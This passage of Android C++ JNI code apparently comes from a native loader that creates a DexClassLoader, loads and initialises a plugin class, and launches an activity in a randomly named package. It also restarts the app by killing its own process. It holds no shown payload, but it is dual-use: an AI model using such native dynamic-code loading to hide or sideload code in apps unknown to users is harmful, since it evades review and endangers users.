    jOptPath = env->NewStringUTF(str_optPath.c_str());

    initDexClassLoaderMethod = env->GetMethodID(
            dexClassLoaderClass, "<init>", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
    dexClassLoader = env->NewObject(dexClassLoaderClass, initDexClassLoaderMethod, jDexFile, jOptPath, nullptr, dxLoader);
    clean:
    if (env->ExceptionCheck()) env->ExceptionClear();
    env->DeleteLocalRef(classLoaderClass);
    env->DeleteLocalRef(dexClassLoaderClass);

    if(jDexFile) env->DeleteLocalRef(jDexFile);
    if(jOptPath) env->DeleteLocalRef(jOptPath);
    return dexClassLoader;
}

bool CHxGameEngine::PluginInit(JNIEnv* env, jobject ctx) {

    jclass cls_DexClassLoader = env->GetObjectClass(m_dexClassLoader);
    jclass cls_Plugin;
    jstring strPluginClass = env->NewStringUTF(PLUGIN_CLASS_ID);//jstring)getObjectStaticField(env, cls_Config, PLUGIN_CLASS_ID,"Ljava/lang/String;");

    cls_Plugin = (jclass)callObjectMethod(env, cls_DexClassLoader, m_dexClassLoader,
                                          "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;",strPluginClass);


    env->DeleteLocalRef(strPluginClass);

    jmethodID mid_PluginCreate = env->GetStaticMethodID(cls_Plugin, PLUGIN_INIT_METHOD_ID, "(Landroid/content/Context;)V");
    if(mid_PluginCreate == nullptr) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        LOGE("PluginInit Method not found. %s",PLUGIN_INIT_METHOD_ID);
        return  true;
    }
    env->CallStaticVoidMethod(cls_Plugin, mid_PluginCreate, ctx);
    return true;
}

bool CHxGameEngine::StartActivity(JNIEnv *env, jobject ctx, jobject intent) {

    jclass cls_Context = env->FindClass("android/content/Context");
    jmethodID mid_StartActivity = env->GetMethodID(cls_Context, "startActivity", "(Landroid/content/Intent;)V");
    env->CallVoidMethod(ctx, mid_StartActivity, intent);
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
        return false;
    }
    return true;
}

bool CHxGameEngine::RaiseStartGameEvent(JNIEnv *env, jobject thiz) {
    LOGD("===============1");
    jclass intentCls = env->FindClass("android/content/Intent");
    jmethodID createIntentMID = env->GetMethodID(intentCls, "<init>","()V");//newObject 都是<init>
    jclass gameActivity = env->FindClass("hlrvpws/ejkdpgks/ktmfb/AppActivity"); //修改 游戏GameActivity
    jobject intentObject = env->NewObject(intentCls, createIntentMID);
    jmethodID setClassMID = env->GetMethodID(intentCls, "setClass","(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;");
    env->CallObjectMethod(intentObject, setClassMID, m_Ctx, gameActivity);
    jclass activityCls = env->FindClass("android/app/Activity");
    jmethodID startActivityMID = env->GetMethodID(activityCls, "startActivity","(Landroid/content/Intent;)V");
    env->CallVoidMethod(thiz, startActivityMID, intentObject);
    LOGD("===============2");
    jmethodID finishMID = env->GetMethodID(activityCls, "finish", "()V");
    env->CallVoidMethod(thiz, finishMID);
    LOGD("===============3");
    return true;
}

bool CHxGameEngine::RestartApp(JNIEnv *env) {
    LOGD("===============RestartApp");
    jclass  cls_Content = env->FindClass("android/content/Context");
    jclass cls_Intent = env->FindClass("android/content/Intent");
    jclass cls_Process = env->FindClass("android/os/Process");
    LOGD("===============RestartApp2");
    jmethodID mid_MyPid = env->GetStaticMethodID(cls_Process, "myPid","()I");
    jmethodID mid_KillProcess = env->GetStaticMethodID(env->FindClass("android/os/Process"), "killProcess","(I)V");
    LOGD("===============RestartApp3");

    jobject obj_PackageManager = callObjectMethod(env, cls_Content, m_Ctx,
                                                  "getPackageManager","()Landroid/content/pm/PackageManager;");
    jstring strPackageName = env->NewStringUTF(m_PackageName.c_str());
    LOGI("obj_PackageManager: %p", obj_PackageManager);
    LOGI("strPackageName: %s", m_PackageName.c_str());
    jobject obj_LaunchIntent = callObjectMethod(env, env->GetObjectClass(obj_PackageManager), obj_PackageManager,
                                                "getLaunchIntentForPackage","(Ljava/lang/String;)Landroid/content/Intent;",
                                                strPackageName);
    LOGI("obj_LaunchIntent: %p", obj_LaunchIntent);
    env->DeleteLocalRef(strPackageName);
    LOGD("===============RestartApp4");
    callObjectMethod(env, cls_Intent, obj_LaunchIntent, "addFlags","(I)Landroid/content/Intent;", FLAG_ACTIVITY_CLEAR_TOP);
    LOGD("===============RestartApp5");
    StartActivity(env, m_Ctx, obj_LaunchIntent);
    jint myPid = env->CallStaticIntMethod(cls_Process, mid_MyPid);
    env->CallStaticVoidMethod(cls_Process, mid_KillProcess, myPid);
    LOGD("===============RestartApp6");
    env->DeleteLocalRef(obj_PackageManager);
    env->DeleteLocalRef(obj_LaunchIntent);
    env->DeleteLocalRef(cls_Content);
    env->DeleteLocalRef(cls_Intent);
    env->DeleteLocalRef(cls_Process);
    LOGD("===============RestartApp7");
    return true;
}



